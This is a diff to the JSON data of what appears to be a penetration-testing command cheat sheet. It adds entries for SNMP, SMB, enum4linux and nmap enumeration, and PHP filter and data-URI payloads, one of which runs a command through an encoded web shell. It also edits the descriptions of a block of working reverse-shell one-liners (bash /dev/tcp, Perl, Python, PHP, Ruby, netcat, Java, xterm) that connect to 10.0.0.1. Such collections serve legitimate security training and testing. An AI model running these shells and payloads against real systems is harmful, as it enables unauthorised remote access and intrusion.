@@ -44,7 +44,7 @@
     {
       "id": 10,
       "Name": "Reverse Shells"
-    },  
+    },
     {
       "id": 11,
       "Name": "Spawn TTY Shell"
@@ -54,11 +54,231 @@
       "Name": "LDAP"
     },
     {
-      "id":13,
-      "Name":"Cracking"
+      "id": 13,
+      "Name": "Cracking"
+    },
+    {
+      "id": 14,
+      "Name": "Misc Linux"
     }
   ],
   "commands": [
+    {
+      "Name": "Start System Service",
+      "Category": 9,
+      "Description": "Starts a specified service using systemctl",
+      "Command": "sudo systemctl start servicename"
+    },
+    {
+      "Name": "Nmap Vulnerability Scan",
+      "Category": 5,
+      "Description": "Performs vulnerability scan on ports 80 and 443 of 192.168.192.13 using Nmap scripts",
+      "Command": "nmap --script vuln -p 80,443 192.168.192.13"
+    },
+    {
+      "Name": "PHP Filter Base64 Payload",
+      "Category": 2,
+      "Description": "Uses PHP filter to encode a resource in base64, potentially for data exfiltration",
+      "Command": "php://filter/convert.base64-encode/resource="
+    },
+    {
+      "Name": "Data URI Command Execution",
+      "Category": 2,
+      "Description": "Executes a base64-encoded PHP payload via data URI to run system command 'uname -a'",
+      "Command": "data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=uname%20-a"
+    },
+    {
+      "Name": "Python HTTP Server",
+      "Category": 14,
+      "Description": "Creates a simple python http server on port 80",
+      "Command": "python3 -m http.server 80 "
+    },
+    {
+      "Name": "Nmap UDP SNMP Scan",
+      "Category": 7,
+      "Description": "Scans for open UDP port 161 (SNMP) across 192.168.50.1-254, saving results to open-snmp.txt",
+      "Command": "sudo nmap -sU --open -p 161 192.168.50.1-254 -oG open-snmp.txt"
+    },
+    {
+      "Name": "Onesixtyone SNMP Brute Force",
+      "Category": 7,
+      "Description": "Performs SNMP community string brute-forcing using a community list against specified IPs",
+      "Command": "onesixtyone -c community -i ips"
+    },
+    {
+      "Name": "SNMPwalk Public Community",
+      "Category": 7,
+      "Description": "Enumerates SNMP data using public community string on 192.168.50.151 with SNMPv1",
+      "Command": "snmpwalk -c public -v1 -t 10 192.168.50.151"
+    },
+    {
+      "Name": "SNMPwalk LAN Manager Users",
+      "Category": 7,
+      "Description": "Enumerates LAN Manager user information via SNMP on 192.168.50.151 using OID 1.3.6.1.4.1.77.1.2.25",
+      "Command": "snmpwalk -c public -v1 192.168.50.151 1.3.6.1.4.1.77.1.2.25"
+    },
+    {
+      "Name": "SNMPwalk Running Processes",
+      "Category": 7,
+      "Description": "Enumerates running processes via SNMP on 192.168.50.151 using OID 1.3.6.1.2.1.25.4.2.1.2",
+      "Command": "snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.25.4.2.1.2"
+    },
+    {
+      "Name": "SNMPwalk Installed Software",
+      "Category": 7,
+      "Description": "Enumerates installed software via SNMP on 192.168.50.151 using OID 1.3.6.1.2.1.25.6.3.1.2",
+      "Command": "snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.25.6.3.1.2"
+    },
+    {
+      "Name": "SNMPwalk TCP Connections",
+      "Category": 7,
+      "Description": "Enumerates TCP connections via SNMP on 192.168.50.151 using OID 1.3.6.1.2.1.6.13.1.3",
+      "Command": "snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.6.13.1.3"
+    },
+    {
+      "Name": "Telnet SMTP Connect",
+      "Category": 7,
+      "Description": "Initiates a Telnet connection to port 25 (SMTP) on 192.168.50.8",
+      "Command": "telnet 192.168.50.8 25"
+    },
+    {
+      "Name": "Enable Telnet Client",
+      "Category": 8,
+      "Description": "Enables the Telnet Client feature on a Windows system using DISM",
+      "Command": "dism /online /Enable-Feature /FeatureName:TelnetClient"
+    },
+    {
+      "Name": "Test-NetConnection SMTP",
+      "Category": 7,
+      "Description": "Tests connectivity to port 25 (SMTP) on 192.168.50.8 using PowerShell",
+      "Command": "Test-NetConnection -Port 25 192.168.50.8"
+    },
+    {
+      "Name": "Netcat SMTP Connect",
+      "Category": 7,
+      "Description": "Establishes a connection to port 25 (SMTP) on 192.168.50.8 with verbose output",
+      "Command": "nc -nv 192.168.50.8 25"
+    },
+    {
+      "Name": "Enum4linux Multi-IP Scan",
+      "Category": 7,
+      "Description": "Runs enum4linux against a list of specified IPs in the 192.168.192.0/24 subnet",
+      "Command": "for i in {254,152,151,149,23,22,21,20,17,15,14,13,12,11,8,9,6}; do enum4linux 192.168.192.$i ; done"
+    },
+    {
+      "Name": "Enum4linux Verbose Scan",
+      "Category": 7,
+      "Description": "Runs enum4linux in verbose mode to show underlying commands",
+      "Command": "enum4linux -v target-ip"
+    },
+    {
+      "Name": "Enum4linux All Options",
+      "Category": 7,
+      "Description": "Runs all enum4linux options except dictionary-based share name guessing",
+      "Command": "enum4linux -a target-ip"
+    },
+    {
+      "Name": "Enum4linux User List",
+      "Category": 7,
+      "Description": "Lists usernames if the server allows (RestrictAnonymous = 0)",
+      "Command": "enum4linux -U target-ip"
+    },
+    {
+      "Name": "Enum4linux User List with Credentials",
+      "Category": 7,
+      "Description": "Lists all users using provided credentials, bypassing RestrictAnonymous",
+      "Command": "enum4linux -u administrator -p password -U target-ip"
+    },
+    {
+      "Name": "Enum4linux Default RID Scan",
+      "Category": 7,
+      "Description": "Pulls usernames from default RID range (500-550,1000-1050)",
+      "Command": "enum4linux -r target-ip"
+    },
+    {
+      "Name": "Enum4linux Custom RID Scan",
+      "Category": 7,
+      "Description": "Pulls usernames using a custom RID range (600-660)",
+      "Command": "enum4linux -R 600-660 target-ip"
+    },
+    {
+      "Name": "Enum4linux Group List",
+      "Category": 7,
+      "Description": "Lists groups, with optional username and password support",
+      "Command": "enum4linux -G target-ip"
+    },
+    {
+      "Name": "Enum4linux Share List",
+      "Category": 7,
+      "Description": "Lists Windows shares, with optional username and password support",
+      "Command": "enum4linux -S target-ip"
+    },
+    {
+      "Name": "Enum4linux Share Dictionary Attack",
+      "Category": 7,
+      "Description": "Performs dictionary attack on shares if share list retrieval is blocked",
+      "Command": "enum4linux -s shares.txt target-ip"
+    },
+    {
+      "Name": "Enum4linux OS Info",
+      "Category": 7,
+      "Description": "Pulls OS information using smbclient, including service pack version",
+      "Command": "enum4linux -o target-ip"
+    },
+    {
+      "Name": "Enum4linux Printer Info",
+      "Category": 7,
+      "Description": "Pulls information about printers known to the target device",
+      "Command": "enum4linux -i target-ip"
+    },
+    {
+      "Name": "Net View Shares",
+      "Category": 7,
+      "Description": "Lists all shared resources on the target domain controller dc01",
+      "Command": "net view \\dc01 /all"
+    },
+    {
+      "Name": "Nmap SMB OS Discovery",
+      "Category": 7,
+      "Description": "Scans for SMB services on ports 139 and 445 with OS discovery script on a single host",
+      "Command": "nmap -v -p 139,445 --script smb-os-discovery 192.168.50.152"
+    },
+    {
+      "Name": "NBTScan",
+      "Category": 7,
+      "Description": "Scans for NetBIOS information on the 192.168.50.0/24 network",
+      "Command": "sudo nbtscan -r 192.168.50.0/24"
+    },
+    {
+      "Name": "Nmap SMB Scan",
+      "Category": 7,
+      "Description": "Scans for SMB services on ports 139 and 445 across a subnet, saving output to smb.txt",
+      "Command": "nmap -v -p 139,445 -oG smb.txt 192.168.50.1-254"
+    },
+    {
+      "Name": "Nmap SYN Scan",
+      "Category": 7,
+      "Description": "Port scanning with nmap",
+      "Command": "nmap -sS 192.168.192.1"
+    },
+    {
+      "Name": "Netcat Port Scan",
+      "Category": 7,
+      "Description": "Port scanning with netcat",
+      "Command": "nc -nvv -w1 -z 192.168.192.151 1-1000"
+    },
+    {
+      "Name": "Netcat UDP Port Scan",
+      "Category": 7,
+      "Description": "UDP Port scanning with netcat",
+      "Command": "nc -nvv -u -w1 -z 192.168.192.151 150-200"
+    },
+    {
+      "Name": "dnsenum",
+      "Category": 0,
+      "Description": "Attempts to retrieve the dns records for the given domain",
+      "Command": "dnsenum domain.com"
+    },
     {
       "Name": "Evil-WinRM",
       "Category": 8,
@@ -158,61 +378,61 @@
     {
       "Name": "Bash Reverse Shell",
       "Category": 10,
-      "Description": "Creates a reverse shell using bash, tested on Ubuntu 10.10",
+      "Description": "Creates a reverse shell using bash, tested on Ubuntu 10.10 checkout https://www.revshells.com for more robust shell creation",
       "Command": "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"
     },
     {
       "Name": "Perl Reverse Shell",
       "Category": 10,
-      "Description": "A short, feature-free Perl reverse shell connecting to a specified IP and port",
+      "Description": "A short, feature-free Perl reverse shell connecting to a specified IP and port checkout https://www.revshells.com for more robust shell creation",
       "Command": "perl -e 'use Socket;$i=\"10.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
     },
     {
       "Name": "Python Reverse Shell",
       "Category": 10,
-      "Description": "A Python reverse shell for Linux with Python 2.7, connecting to a specified IP and port",
+      "Description": "A Python reverse shell for Linux with Python 2.7, connecting to a specified IP and port checkout https://www.revshells.com for more robust shell creation",
       "Command": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
     },
     {
       "Name": "PHP Reverse Shell",
       "Category": 10,
-      "Description": "A PHP reverse shell assuming TCP connection uses file descriptor 3 (try 4, 5, 6 if needed)",
+      "Description": "A PHP reverse shell assuming TCP connection uses file descriptor 3 (try 4, 5, 6 if needed) checkout https://www.revshells.com for more robust shell creation",
       "Command": "php -r '$sock=fsockopen(\"10.0.0.1\",1234);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
     },
     {
       "Name": "Ruby Reverse Shell",
       "Category": 10,
-      "Description": "A Ruby reverse shell connecting to a specified IP and port",
+      "Description": "A Ruby reverse shell connecting to a specified IP and port checkout https://www.revshells.com for more robust shell creation",
       "Command": "ruby -rsocket -e'f=TCPSocket.open(\"10.0.0.1\",1234).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
     },
     {
       "Name": "Netcat Reverse Shell",
       "Category": 10,
-      "Description": "A Netcat reverse shell, requires -e option support",
+      "Description": "A Netcat reverse shell, requires -e option support checkout https://www.revshells.com for more robust shell creation",
       "Command": "nc -e /bin/sh 10.0.0.1 1234"
     },
     {
       "Name": "Netcat FIFO Reverse Shell",
       "Category": 10,
-      "Description": "An alternative Netcat reverse shell using FIFO for systems without -e option",
+      "Description": "An alternative Netcat reverse shell using FIFO for systems without -e option checkout https://www.revshells.com for more robust shell creation",
       "Command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f"
     },
     {
       "Name": "Java Reverse Shell",
       "Category": 10,
-      "Description": "A Java reverse shell connecting to a specified IP and port (untested)",
+      "Description": "A Java reverse shell connecting to a specified IP and port (untested) checkout https://www.revshells.com for more robust shell creation",
       "Command": "r = Runtime.getRuntime(); p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[]); p.waitFor()"
     },
     {
       "Name": "Xterm Reverse Shell",
       "Category": 10,
-      "Description": "An xterm reverse shell connecting to a specified IP on port 6001",
+      "Description": "An xterm reverse shell connecting to a specified IP on port 6001 checkout https://www.revshells.com for more robust shell creation",
       "Command": "xterm -display 10.0.0.1:1"
     },
     {
       "Name": "Xnest Setup",
       "Category": 10,
-      "Description": "Starts an X-Server to catch incoming xterm on port 6001 (run on your system)",
+      "Description": "Starts an X-Server to catch incoming xterm on port 6001 (run on your system) checkout https://www.revshells.com for more robust shell creation",
       "Command": "Xnest :1"
     },
     {
@@ -250,7 +470,7 @@
       "Category": 0,
       "Description": "Look for cloud buckets by company names and variations with bucket keywords",
       "Command": "https://grayhatwarfare.com/"
-    },        
+    },
     {
       "Name": "XXE",
       "Category": 2,
